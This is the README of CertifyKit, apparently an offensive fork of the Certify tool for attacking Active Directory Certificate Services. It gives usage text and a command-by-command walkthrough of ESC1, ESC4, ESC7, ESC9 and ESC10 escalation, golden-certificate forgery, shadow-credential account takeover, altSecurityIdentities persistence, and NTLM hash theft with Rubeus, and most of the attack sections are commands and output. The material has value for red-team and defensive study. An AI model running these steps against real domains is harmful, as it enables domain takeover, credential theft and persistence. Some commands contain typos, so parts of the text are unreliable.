# CertifyKit
CertifyKit is a fork of [Certify](https://github.com/GhostPack/Certify) with following handy functions in addition:

- THEFT4 - Search certificate file in folder recursively or search certificate in certificate stores
- THEFT1/DPERSIST1 - Export certificate or golden certificate
- ESC1 - Create machine account
- ESC4 - Alter template to Smart Card Authen template
- ESC7 - Issue pending or deleted certificate request
- ESC9/10 - Alter dNSHostName of a machine account or alter userPrincipalName of a user account
- Shadow Credential attack
- Account persistence with altSecurityIdentities

## Usage

```shell
C:\>.\CertifyKit.exe
CertifyKit (Hagrid29 version of Certify)
More info: https://github.com/Hagrid29/CertifyKit/


Find information about all registered CAs:

    CertifyKit.exe cas [/ca:SERVER\ca-name | /domain:domain.local | /ldapserver:server.domain.local | /path:CN=Configuration,DC=domain,DC=local] [/hideAdmins] [/showAllPermissions] [/skipWebServiceChecks] [/quiet]


  Find all enabled certificate templates:

    CertifyKit.exe find [/ca:SERVER\ca-name | /domain:domain.local | /ldapserver:server.domain.local | /path:CN=Configuration,DC=domain,DC=local] [/quiet]

  Find vulnerable/abusable certificate templates using default low-privileged groups:

    CertifyKit.exe find /vulnerable [/ca:SERVER\ca-name | /domain:domain.local | /ldapserver:server.domain.local | /path:CN=Configuration,DC=domain,DC=local] [/quiet]

  Find vulnerable/abusable certificate templates using all groups the current user context is a part of:

    CertifyKit.exe find /vulnerable /currentuser [/ca:SERVER\ca-name | /domain:domain.local | /ldapserver:server.domain.local | /path:CN=Configuration,DC=domain,DC=local] [/quiet]

  Find enabled certificate templates where ENROLLEE_SUPPLIES_SUBJECT is enabled:

    CertifyKit.exe find /enrolleeSuppliesSubject [/ca:SERVER\ca-name| /domain:domain.local | /ldapserver:server.domain.local | /path:CN=Configuration,DC=domain,DC=local] [/quiet]

  Find enabled certificate templates capable of client authentication:

    CertifyKit.exe find /clientauth [/ca:SERVER\ca-name | /domain:domain.local | /ldapserver:server.domain.local | /path:CN=Configuration,DC=domain,DC=local] [/quiet]

  Find all enabled certificate templates, display all of their permissions, and don't display the banner message:

    CertifyKit.exe find /showAllPermissions /quiet [/ca:COMPUTER\CA_NAME | /domain:domain.local | /ldapserver:server.domain.local | /path:CN=Configuration,DC=domain,DC=local]

  Find all enabled certificate templates and output to a json file:

    CertifyKit.exe find /json /log:C:\Temp\out.json [/ca:COMPUTER\CA_NAME | /domain:domain.local | /ldapserver:server.domain.local | /path:CN=Configuration,DC=domain,DC=local]


  Enumerate access control information for PKI objects:

    CertifyKit.exe pkiobjects [/domain:domain.local | /ldapserver:server.domain.local] [/showAdmins] [/quiet]


  Request a new certificate using the current user context:

    CertifyKit.exe request /ca:SERVER\ca-name [/subject:X] [/template:Y] [/install]

  Request a new certificate using the current machine context:

    CertifyKit.exe request /ca:SERVER\ca-name /machine [/subject:X] [/template:Y] [/install]

  Request a new certificate using the current user context but for an alternate name (if supported):

    CertifyKit.exe request /ca:SERVER\ca-name /template:Y /altname:USER

  Request a new certificate on behalf of another user, using an enrollment agent certificate:

    CertifyKit.exe request /ca:SERVER\ca-name /template:Y /onbehalfof:DOMAIN\USER /enrollcert:C:\Temp\enroll.pfx [/enrollcertpw:CERT_PASSWORD]

  Alter the template to smart card template and request a new certificate for an alternate name and restore the template to original state:

    CertifyKit.exe request /ca:SERVER\ca-name /template:Y /alter /altname:USER


  Download an already requested certificate:

    CertifyKit.exe download /ca:SERVER\ca-name /id:ID [/install] [/machine]

  Issue a pending or deleted certificate:

    CertifyKit.exe download /ca:SERVER\ca-name /issue /id:ID


  List all certificates in store My,CurrentUser by default or in a folder recursively:

    CertifyKit.exe list [/storename:X | /sotrelocation:Y | /certificate:C:\Users\] [/password:CERT_PASSWORD] [/recurse]

  Read a certificate specifying thumbprint or file or base64 string with password and export as file or base64 string with a password:

    CertifyKit.exe list /certificate:THUMBPRINT/FILE/BASE64 [/outfile:exportfile.pfx | /base64] /password:CERT_PASSWORD /encpass:ENC_PASSWORD

  Import a certificate from file or base64 string with password to store My,CurrentUser by default

    CertifyKit.exe list /certificate:FILE/BASE64 [/outfile:exportfile.pfx | /base64] /password:CERT_PASSWORD [/storename:X | /sotrelocation:Y]

  Build chain of a certificate from store My,CurrentUser by default specifying thumbprint:

    CertifyKit.exe list /certificate:THUMBPRINT [/storename:X | /sotrelocation:Y] /chain

  Remove a certificate from store My,CurrentUser by default specifying thumbprint:

    CertifyKit.exe list /certificate:THUMBPRINT /remove [/storename:X | /sotrelocation:Y]


  Backup private key for a Certificate Authority's CA certificate on CA server, which could be used to forge AD CS certificate:

    Certify list /golden [/outfile:C:\backup.pfx | /base64] [/encpass:ENC_PASSWORD]


  Create or remove a machine account:

    Certify account /machine:MACHINE [/createpc | /removepc] [/domain:domain.local | /ldapserver:server.domain.local]

  Alter dNSHostName of a machine account or alter userPrincipalName of a user/machine account or clear userPrincipalName of a user account:

    Certify account [/machine:MACHINE | /user:USER] [/dns:new.domain.local | /upn:new@domain.local] [clear]

  Alter or query attribute of an account:

    Certify account [/machine:MACHINE | /user:USER] /attribute:ATTRIBUTE [/query | /value:VALUE | /clear | /remove:ID] [/append]


  Shadow credentail attack on a machine account and output self signed certificate as base64 string by default:

    Certify account /machine:MACHINE /shadow [/outfile:C:\xxx.pfx | /install] [/encpass:ENC_PASSWORD]

  Query or Remove or clear KeyCredentialLink on a user account:

    Certify account /user:USER /shadow [/list | /remove:ID | /clear]


  Map a certificate to a machine account for the purpose of authentication:

    Certify account /machine:MACHINE /altsecid /certificate:THUMBPRINT/FILE/BASE64 [/password:CERT_PASSWORD]

  Query or Remove or clear altSecurityIdentities on a user account:

    Certify account /user:USER /altsecid [/list | /remove:ID | /clear]
```

## Example Walkthrough
#### THEFT4 - *Theft of existing certificates via file/directory triage*

Search certificate files in a folder recursively

```
CertifyKit.exe list /certificate:C:\Users\ /recurse
```

#### THEFT1 - *Export certificate using Window’s Crypto APIs*

List certificates in store for personal certificates assigned to the local machine.

```
C:\>.\CertifyKit.exe list /storename:my /storelocation:localmachine
CertifyKit (Hagrid29 version of Certify)
More info: https://github.com/Hagrid29/CertifyKit/

[*] Action: List Certificates

  Location           : My, LocalMachine
  Issuer             : CN=corp-CORPADCS-CA-1, DC=corp, DC=local
  HasPrivateKey      : True
  KeyExportable      : True
  Thumbprint         : 64F8A2CCF06C7609918D8DA66B1A29B91722E392
  EnhancedKeyUsages  : <null>      [!] Certificate can be used for client authentication!
  SubjectAltName     :

```

Export certificate specifying thumbprint to file

```
C:\>.\CertifyKit.exe list /storename:my /storelocation:localmachine /certificate:64F8A2CCF06C7609918D8DA66B1A29B91722E392 /outfile:cert.pfx
CertifyKit (Hagrid29 version of Certify)
More info: https://github.com/Hagrid29/CertifyKit/

[*] Action: List Certificates

[*] Export certificate   : cert.pfx


Certify completed in 00:00:00.0944640
```

#### DPERSIST1 - *Golden Certificate*

Export CA's certificate with private key on CA server

```
CertifyKit.exe list /golden /outfile:gold.p12
```

Forge a certificate with subject alternative name "administrator@corp.local" offline with [ForgeCert](https://github.com/GhostPack/ForgeCert)

```
ForgeCert.exe --CaCertPath gold.p12.p12 --CaCertPassword "" --Subject "CN=administrator" --SubjectAltName "administrator@corp.local" --NewCertPath admin.pfx --NewCertPassword ""
```

#### ESC1 - *Misconfigured Certificate Templates* (Machine Context)

Certify supply option `/machine` to request certificate in machine account context. It requires administrative privilege on local machine. Instead, we could

Create machine account

```
CertifyKit.exe account /machine:mypc /password:P@ssw0rd123 /create
```

Inject TGT of machine account with [Rubeus](https://github.com/GhostPack/Rubeus)

```
Rubeus.exe asktgt /user:mypc /password:P@ssw0rd123 /ptt
```

Request a new certificate for vulnerable template/CA, specifying a  `administrator` as the alternate principal, and install the certificate: 

```
CertifyKit.exe request /ca:corpadcs.corp.local\corp-CORPADCS-CA-1 /template:VulnTemplate /altname:administrator /install
```

#### ESC4 - *Vulnerable Certificate Template Access Control*

If we have write privilege and enroll privilege over a certificate template, we could alter the template to smart card template which vulnerable as ESC1

```
CertifyKit.exe request /ca:corpadcs.corp.local\corp-CORPADCS-CA-1 /template:VulnTemplate /alter /altname:administrator
```


#### ESC7 - *Vulnerable Certificate Authority Access Control*

Assume we are CA manager. We could escalate privilege by issuing pending/deleted certificate

Enroll a new certificate for a template vulnerable as ESC1 except no enroll right require. Default template `SubCA` fulfil the requirement. Failed enrollment is expected.

```
CertifyKit.exe request /ca:corpadcs.corp.local\corp-CORPADCS-CA-1 /template:SubCA /altname:administrator
```

Issue the failed certificate request with CA manager privilege (the command work on server 2016+ only)

```
CertifyKit.exe download /issue /id:145
```

Download the certificate

```
CertifyKit.exe download /id:145
```

#### ESC9 - *CT_FLAG_NO_SECURITY_EXTENSION*

Assume 

- VulnTemplate set attribute `msPKI-Enrollment-Flag` to value `NO_SECURITY_EXTENSION` 
- VulnTemplate contain suitable `EKU` 
- `StrongCertificateBindingEnforcement` set to 0 or 1 (default is 1)
- VulnTemplate set attribute `msPKI-Certificate-Name-Flag`to value `SUBJECT_ALT_REQUIRE_UPN`

- Write privilege over a user account or a machine account

Example of machine account scenario

Add "Shadow Credential" to machine account Mypc 

```
CertifyKit.exe account /machineLmypc /shadow /outfile:mypc-shadow.pfx
```

Change `userPrincipalName` of Mypc to Domain Admin 

```
CertifyKit.exe account /machine:mypc /upn:administrator
```

Authenticate as Mypc and inject TGT

```
Rubeus.exe /user:mypc /certificate:mypc-shadow.pfx /ptt
```

Enroll a new certificate for the vulnerable template

```
CertifyKit.exe request /ca:corpadcs.corp.local\corp-CORPADCS-CA-1 /template:VulnTemplate /install
```

Clear `userPrincipalName` of Mypc

```
CertifyKit.exe account /user:mypc /upn /clear
```

Authenticate as Domain Admin

```
Rubeus.exe /user:administrator /certificate:4E4C47F105D71D353CC45BF3F33B83B2721B0416
```

#### ESC10 - *Certificate Mappings after Restoring Old Value that before patch*

**Case 1 (Kerberos Certificate Mapping)**

Assume:

- `StrongCertificateBindingEnforcement` set to 0 (default is 1)

User Account scenario

- Write privilege over a user account

Machine account scenario

- Write privilege over a machine account
- VulnTemplate set attribute `msPKI-Certificate-Name-Flag`to value `SUBJECT_ALT_REQUIRE_UPN`
- Machine account have enroll privilege on VulnTemplate
- VulnTemplate contain suitable `EKU` 

Example of user account scenario

Add "Shadow Credential" to account User02 

Change `userPrincipalName` of User02 to DNS hostname of Domain Controller (or Domain Admin account: administrator)

```
CertifyKit.exe account /user:user02 /upn:corpdc01$@corp.local
```

Authenticate as User02 and inject TGT

Enroll a new certificate for template `user`

```
CertifyKit.exe request /ca:corpadcs.corp.local\corp-CORPADCS-CA-1 /template:user /install
```

Restore `userPrincipalName` of User02 to original value

Authenticate as Domain Controller using Kerberos

```
Rubeus.exe /user:corpdc01 /certificate:4E4C47F105D71D353CC45BF3F33B83B2721B0416
```

**Case 2 (Schannel Certificate Mapping)**

Assume:

- `CertificateMappingMethods` contains UPN bit flag (0x4) (Default value 0x18 (0x8 | 0x10), old value 0x1F.)
- Write privilege over User02

Additional requirement to compromise user account:

- there is no userPrincipalName set or the userPrincipalName doesn’t match the sAMAccountName of that account

Add "Shadow Credential" to account User02 

Change `userPrincipalName` of user02 to DNS hostname of Domain Controller (or Domain Admin account: administrator@corp.local)

Authenticate as User02 and inject TGT

Enroll a new certificate for template `user`

Restore `userPrincipalName` of User02 to original value

Authenticate as machine account using Schannel with [PassTheCert](https://github.com/AlmondOffSec/PassTheCert) to add RBCD

```
PassTheCert.exe --server corpadcs.corp.local --cert-path .\esc10-2.pfx --rbcd --target "CN=CORPDC01,OU=Domain Controllers,DC=corp,DC=local" --sid S-1-5-21-3686061768-1206333381-2520098238-1104
```

#### MISC - *Shadow Credential*

If we have write privilege over an account, we could take over the account by manipulating its `msDS-KeyCredentialLink` attribute, effectively adding "Shadow Credentials" to the target account.

```
CertifyKit.exe account /user:user02 /shadow /outfile:user02-shadow.pfx
```

Authenticate with the "Shadow Credential", and steal NTLM hash

```
Rubeus.exe asktgt /user:user02 /certificate:user02-shadow.pfx /getcredentials
```

List "Shadow Credential" added to an account

```
C:\>.\CertifyKit.exe account /user:user02 /shadow /list
CertifyKit (Hagrid29 version of Certify)
More info: https://github.com/Hagrid29/CertifyKit/

[*] Action: Account Operation

[*] Account user02 attribute:
  msDS-KeyCredentialLink :
    [0] :   DeviceID: 54c93625-7866-41ba-96fe-5c742cc423f9 | Creation Time: 8/21/2022 11:35:46 PM
    [1] :   DeviceID: b130c63d-b1f8-404a-889e-a705ddf9abcb | Creation Time: 8/21/2022 11:35:21 PM
```

Remove specific "Shadow Credential"

```
CertifyKit.exe account /user:user02 /remove:0
```

Clear all  "Shadow Credential"

```
CertifyKit.exe account /user:user02 /shadow /clear
```

#### MISC - *Account persistence with altSecurityIdentities* 

If we have write privilege over an account, we could map a certificate to the account for the purpose of authentication by manipulating its `altSecurityIdentities` attribute

Assume we obtained Domain Admin privilege. We could perform persistence attack on multiple accounts

Request a certificate for persistence attack (Alter the template to smart card template and leave the `subjectAltName` blank)

```
C:\> .\CertifyKit.exe request /ca:corpadcs.corp.local\corp-CORPADCS-CA-1 /template:AnyTemplate /alter /install

C:\>.\CertifyKit.exe list
CertifyKit (Hagrid29 version of Certify)
More info: https://github.com/Hagrid29/CertifyKit/

[*] Action: List Certificates

  Location           : My, CurrentUser
  Issuer             : CN=corp-CORPADCS-CA-1, DC=corp, DC=local
  HasPrivateKey      : True
  KeyExportable      : True
  Thumbprint         : F5EE8B01C33DDF4161E554DD2FB7ED63503FEF12
  EnhancedKeyUsages  :
       Client Authentication     [!] Certificate can be used for client authentication!
       Smart Card Logon     [!] Certificate can be used for client authentication!
  SubjectAltName     :
```

Map the certificate to multiple user

```
C:\>.\CertifyKit.exe account /machine:testpc /altsecid /certificate:F5EE8B01C33DDF4161E554DD2FB7ED63503FEF12
C:\>.\CertifyKit.exe account /user:user02 /altsecid /certificate:F5EE8B01C33DDF4161E554DD2FB7ED63503FEF12
```

Authenticate as multiple users with a single certificate, and steal NTLM hash

```
C:\>.\Rubeus.exe asktgt /user:testpc /certificate:F5EE8B01C33DDF4161E554DD2FB7ED63503FEF12 /getcredentials
C:\>.\Rubeus.exe asktgt /user:user02 /certificate:F5EE8B01C33DDF4161E554DD2FB7ED63503FEF12 /getcredentials
```

##### Comparing `/shadow` and `/altsecid`

- `/altsecid` require CA signed cert, while `/shadow` cert can be self sign

- `/altsecid` cert could be revoked, while `/shadow` self sign cert could not be revoked

- `/altsecid` can map to multiple account, while `/shadow` cert can only map to signal account

## References

* https://github.com/GhostPack/Certify
* https://research.ifcr.dk/certipy-2-0-bloodhound-new-escalations-shadow-credentials-golden-certificates-and-more-34d1c26f0dc6
* https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7
* https://github.com/cfalta/PoshADCS
* https://github.com/eladshamir/Whisker
* https://github.com/Kevin-Robertson/Powermad
* https://github.com/TheWover/CertStealer
